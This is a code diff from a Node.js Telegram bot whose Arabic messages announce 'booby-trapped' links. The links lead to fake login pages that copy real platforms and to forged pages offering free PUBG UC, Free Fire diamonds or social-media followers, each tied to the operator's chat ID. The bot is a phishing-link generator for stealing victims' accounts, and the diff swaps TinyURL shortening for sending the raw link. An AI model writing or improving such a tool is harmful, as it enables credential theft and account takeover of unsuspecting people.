@@ -4033,32 +4033,25 @@ bot.on('callback_query', (query) => {
 
     let url, message;
 
-    function shortenUrlAndSendMessage(url, messagePrefix) {
-        axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`)
-            .then(response => {
-                const shortUrl = response.data;
-                bot.sendMessage(chatId, `${messagePrefix} ${shortUrl}`);
-            })
-            .catch(error => {
-                bot.sendMessage(chatId, 'حدث خطأ أثناء اختصار الرابط. الرجاء المحاولة لاحقًا.');
-            });
+    function sendMessage(url, messagePrefix) {
+        bot.sendMessage(chatId, `${messagePrefix} ${url}`);
     }
 
     if (data.startsWith('login_')) {
         const platform = data.split('_')[1];
         url = `${baseUrl}/login/${platform}/${chatId}`;
         message = `تم تلغيم رابط اندكس تسجيل دخول يشبه الصفحة الحقيقية لحد المنصة: ${getPlatformName(platform)}:`;
-        shortenUrlAndSendMessage(url, message);
+        sendMessage(url, message);
     } else if (data === 'pubg_uc' || data === 'free_fire_diamonds' || data === 'toptop_coins') { // أضفنا toptop_coins
         const game = data === 'pubg_uc' ? 'pubg_uc' : (data === 'free_fire_diamonds' ? 'free_fire_diamonds' : 'toptop_coins');
         url = `${baseUrl}/increase/${game}/${chatId}`;
         message = `تم تلغيم رابط اختراق على شكل صفحة مزورة لشحن ${getPlatformName(game)} مجانًا:`;
-        shortenUrlAndSendMessage(url, message);
+        sendMessage(url, message);
     } else if (data.startsWith('increase_')) {
         const platform = data.split('_')[1];
         url = `${baseUrl}/increase/${platform}/${chatId}`;
         message = `تم تلغيم رابط اختراق على شكل صفحة مزورة لزيادة المتابعين ${getPlatformName(platform)}:`;
-        shortenUrlAndSendMessage(url, message);
+        sendMessage(url, message);
     } else {
         console.log('Unhandled callback query:', data);
         return;
@@ -4080,10 +4073,7 @@ function getPlatformName(platform) {
     return platformNames[platform] || platform;
 }
 
-
-
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
 });
-
